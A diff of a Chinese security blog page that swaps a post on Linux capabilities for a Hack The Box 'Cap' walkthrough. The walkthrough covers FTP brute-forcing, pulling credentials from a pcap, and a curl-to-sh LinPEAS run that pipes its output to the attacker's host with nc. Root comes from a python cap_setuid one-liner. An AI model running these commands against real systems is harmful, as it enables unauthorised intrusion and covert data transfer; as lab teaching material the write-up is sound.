@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Linux Capabilities | Elin 的空间</title>
-  <meta name="keywords" content=" linux , 提权 ">
-  <meta name="description" content="Linux Capabilities | Elin 的空间">
+  <title>HTB cap | Elin 的空间</title>
+  <meta name="keywords" content=" linux ">
+  <meta name="description" content="HTB cap | Elin 的空间">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="IP ROLE OS    10.10.10.245 Victim Linux   10.10.14.228 Attacker Kali    如果你是在找writeup而看的这篇文章，那么请再坚持一下。这里给一点提示:  仔细观察表面内容，这题并没有需要深挖的内容，别想多 root的方法题目已经给出来了   获取普通权限通过nmap检查端口，发现有21 22 80端口打开，再没有其他端口。">
 <meta property="og:type" content="article">
@@ -568,9 +568,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-linux-capabilities" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-HTB-cap" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Linux Capabilities</h1>
+        <h1 class="article-title">HTB cap</h1>
     
     <div class="article-meta">
         
@@ -582,7 +582,7 @@
             
             <a  data-rel="渗透">渗透</a> > 
             
-            <a  data-rel="渗透&lt;---&gt;知识点">知识点</a>
+            <a  data-rel="渗透&lt;---&gt;HTB">HTB</a>
             
         </span>
         
@@ -592,14 +592,12 @@
             
             <a class="color1">linux</a>
             
-            <a class="color3">提权</a>
-            
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-07-22 17:32:18'>2021-07-21 09:58</time>
+            发布时间 : <time class="date" title='最后更新: 2021-07-22 17:32:18'>2021-07-22 16:17</time>
         
     </div>
     <div class="article-meta">
@@ -621,7 +619,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCapabilities"><span class="toc-text">什么是Capabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#capabilities-set"><span class="toc-text">capabilities set</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8BCAP"><span class="toc-text">进程CAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6CAP"><span class="toc-text">二进制文件CAP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-text">如何利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python-%E6%8B%A5%E6%9C%89-CAP-SETUID"><span class="toc-text">python 拥有 CAP_SETUID</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90"><span class="toc-text">获取普通权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-LinPEAS"><span class="toc-text">使用 LinPEAS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilities"><span class="toc-text">Capabilities</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-text">后记</span></a>
     
 <style>
     .left-col .switch-btn,
@@ -637,129 +635,102 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="什么是Capabilities"><a href="#什么是Capabilities" class="headerlink" title="什么是Capabilities"></a>什么是Capabilities</h2><p>Capabilites是从内核2.5之后引入的，作用于<strong>进程</strong>或者<strong>线程</strong>上，是将权限更加细致的划分，保障系统安全的一种能力。<br>类似于windows的特权。</p>
-<h2 id="capabilities-set"><a href="#capabilities-set" class="headerlink" title="capabilities set"></a>capabilities set</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-avrasm codeBlockLines"><span class="line">root@iZbp19p0eesh0lxr45we33Z:~<span class="hljs-meta"># cat /proc/$$/status | grep Cap</span></span>
-<span class="line"><span class="hljs-symbol">CapInh:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># 可以继承的CAP(i)</span></span>
-<span class="line"><span class="hljs-symbol">CapPrm:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以使用的CAP(p)</span></span>
-<span class="line"><span class="hljs-symbol">CapEff:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 使用的CAP(e)</span></span>
-<span class="line"><span class="hljs-symbol">CapBnd:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以被禁止的</span></span>
-<span class="line"><span class="hljs-symbol">CapAmb:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># </span></span>
-</code></pre></div></div>
-
-
-<h2 id="进程CAP"><a href="#进程CAP" class="headerlink" title="进程CAP"></a>进程CAP</h2><ul>
-<li>查看进程CAP</li>
-</ul>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1234</span>/status | grep Cap  <span class="hljs-comment"># 查看1234进程的能力</span></span>
-<span class="line">cat <span class="hljs-regexp">/proc/</span>$$/status | grep Cap <span class="hljs-comment"># 查看现在进程的能力</span></span>
-</code></pre></div></div>
-
-<ul>
-<li>解码CAP</li>
-</ul>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">capsh <span class="hljs-attribute">--decode</span>=0000000000003000</span>
-<span class="line"><span class="hljs-attribute">0x0000000000003000</span>=cap_net_admin,cap_net_raw</span>
-</code></pre></div></div>
-
-<h2 id="二进制文件CAP"><a href="#二进制文件CAP" class="headerlink" title="二进制文件CAP"></a>二进制文件CAP</h2><ul>
-<li>查看二进制文件CAP</li>
-</ul>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">getcap <span class="hljs-regexp">/usr/</span>bin/ping</span>
-<span class="line">getcap `whereis python3`</span>
-</code></pre></div></div>
-
-<ul>
-<li>搜索所有二进制文件的CAP</li>
-</ul>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-literal">null</span></span>
-</code></pre></div></div>
-
-<h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>根据不同的CAP找出对应的提权方法，详细方法在<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use">这里查看</a></p>
-<table>
+        <table>
 <thead>
 <tr>
-<th align="center">CAP</th>
-<th align="center">描述</th>
-<th align="center">能否提权</th>
+<th align="center">IP</th>
+<th align="center">ROLE</th>
+<th align="center">OS</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center">CAP_SYS_ADMIN</td>
-<td align="center">可以挂在文件系统</td>
-<td align="center">√</td>
+<td align="center">10.10.10.245</td>
+<td align="center">Victim</td>
+<td align="center">Linux</td>
 </tr>
 <tr>
-<td align="center">CAP_SYS_PTRACE</td>
-<td align="center">可以shellcode注入并逃离容器</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_SYS_MODULE</td>
-<td align="center">可以增加或者移除核心模块</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_DAC_READ_SEARCH</td>
-<td align="center">可以绕过查看文件和执行文件的检查</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_DAC_OVERRIDE</td>
-<td align="center">写任意文件</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_CHOWN</td>
-<td align="center">更改任意文件的所有者</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_FORMER</td>
-<td align="center">更改任意文件的权限</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_SETUID</td>
-<td align="center">设置有效用户</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_SETGID</td>
-<td align="center">设置有效组</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_SETFCAP</td>
-<td align="center">可以设置文件或者进程的CAP</td>
-<td align="center">√</td>
-</tr>
-<tr>
-<td align="center">CAP_KILL</td>
-<td align="center">可以杀死任何进程</td>
-<td align="center">×</td>
-</tr>
-<tr>
-<td align="center">CAP_NET_BIND_SERVICE</td>
-<td align="center">可以监听任何端口</td>
-<td align="center">×</td>
-</tr>
-<tr>
-<td align="center">CAP_NET_RAW</td>
-<td align="center">可以嗅探接口</td>
-<td align="center">×</td>
-</tr>
-<tr>
-<td align="center">CAP_NET_ADMIN + CAP_NET_RAW</td>
-<td align="center">可以修改防护墙规则</td>
-<td align="center">×</td>
-</tr>
-<tr>
-<td align="center">CAP_LINUX_IMMUTABLE</td>
-<td align="center">修改inode属性</td>
-<td align="center">×</td>
+<td align="center">10.10.14.228</td>
+<td align="center">Attacker</td>
+<td align="center">Kali</td>
 </tr>
 </tbody></table>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="python-拥有-CAP-SETUID"><a href="#python-拥有-CAP-SETUID" class="headerlink" title="python 拥有 CAP_SETUID"></a>python 拥有 CAP_SETUID</h3><p><img src="/2021/07/21/linux-capabilities/1.png"></p>
+<blockquote>
+<p>如果你是在找writeup而看的这篇文章，那么请再坚持一下。这里给一点提示:</p>
+<ol>
+<li>仔细观察表面内容，这题并没有需要深挖的内容，别想多</li>
+<li>root的方法题目已经给出来了</li>
+</ol>
+</blockquote>
+<h2 id="获取普通权限"><a href="#获取普通权限" class="headerlink" title="获取普通权限"></a>获取普通权限</h2><p>通过nmap检查端口，发现有<code>21 22 80</code>端口打开，再没有其他端口。</p>
+<p>第一反应是ftp的匿名用户或者常用用户。尝试爆破，这里推荐<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">这个字典</a></p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">hydra -C password.txt -u -e s 10.10.10.245 ftp</span>
+</code></pre></div></div>
+
+<p>ftp这里其实是个幌子，使用常用密码爆破没有作用。</p>
+<p>然后打开80网页，通过观察，发现<code>10.10.10.245/data/3</code>这个页面是的数字是变动的，更改为<code>0</code>后获取pcap文件。</p>
+<p>用<code>Wireshark</code>打开后过观察报文发现有FTP报文，追踪TCP流的到FTP用户密码</p>
+<p><img src="/2021/07/22/HTB-cap/1.png"></p>
+<p>ssh 登录</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">ssh</span> nathan@<span class="hljs-number">10.10.10.245</span></span>
+</code></pre></div></div>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权起手式</p>
+<ul>
+<li>查看<code>sudo -l</code> </li>
+<li>利用<code>LinPEAS</code>搜索</li>
+</ul>
+<p>当查看<code>sudo -l</code>的时候，此用户没有任何内容</p>
+<h3 id="使用-LinPEAS"><a href="#使用-LinPEAS" class="headerlink" title="使用 LinPEAS"></a>使用 <code>LinPEAS</code></h3><p>使用不写入硬盘的方式利用<code>LinPEAS</code>，这里用到<a target="_blank" rel="noopener" href="https://github.com/Elinpf/cmder">cmder</a>工具提示命令。</p>
+<p>下载LinPEAS</p>
+<p><img src="/2021/07/22/HTB-cap/2.png"></p>
+<p>监听端口并发送LinPEAS</p>
+<p><img src="/2021/07/22/HTB-cap/3.png"></p>
+<p><img src="/2021/07/22/HTB-cap/4.png"></p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python3 -m http.server 5711 &amp;</span>
+<span class="line">nc -lvnp 1633 | tee linpeas.out</span>
+</code></pre></div></div>
+
+<p>用cmder得到命令后，到目标机上执行</p>
+<p><img src="/2021/07/22/HTB-cap/5.png"></p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">curl 10.10.14.228:5711/linpeas.sh | sh | nc 10.10.14.228 1633</span>
+</code></pre></div></div>
+
+<p>这样就可以不留痕迹的得到输出文件了</p>
+<h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>观察输出文件发现</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">╔══════════╣ Capabilities</span>
+<span class="line">╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span>
+<span class="line">Current capabilities:</span>
+<span class="line">Current: =</span>
+<span class="line">CapInh: 0000000000000000</span>
+<span class="line">CapPrm: 0000000000000000</span>
+<span class="line">CapEff: 0000000000000000</span>
+<span class="line">CapBnd: 0000003fffffffff</span>
+<span class="line">CapAmb: 0000000000000000</span>
+<span class="line"></br></span>
+<span class="line">Shell capabilities:</span>
+<span class="line">0x0000000000000000=</span>
+<span class="line">CapInh: 0000000000000000</span>
+<span class="line">CapPrm: 0000000000000000</span>
+<span class="line">CapEff: 0000000000000000</span>
+<span class="line">CapBnd: 0000003fffffffff</span>
+<span class="line">CapAmb: 0000000000000000</span>
+<span class="line"></br></span>
+<span class="line">Files with capabilities (limited to 50):</span>
+<span class="line marked">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span>
+<span class="line">/usr/bin/ping = cap_net_raw+ep</span>
+<span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span>
+<span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span>
+<span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span>
+</code></pre></div></div>
+
+<p>了解到<code>python3.8</code>拥有<code>cap_setuid</code>的能力。 关于Capabilities请查看<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></p>
+<p><code>cap_setuid</code>可以设置有效用户，能够提权。</p>
+<p>因为是python，所以利用方法为</p>
+<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">/usr/bin/python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span>
+</code></pre></div></div>
+
+<p>得到root权限</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本题简单，但是也有知识点，需要对<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a>有所了解。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 365433079@qq.com </span>
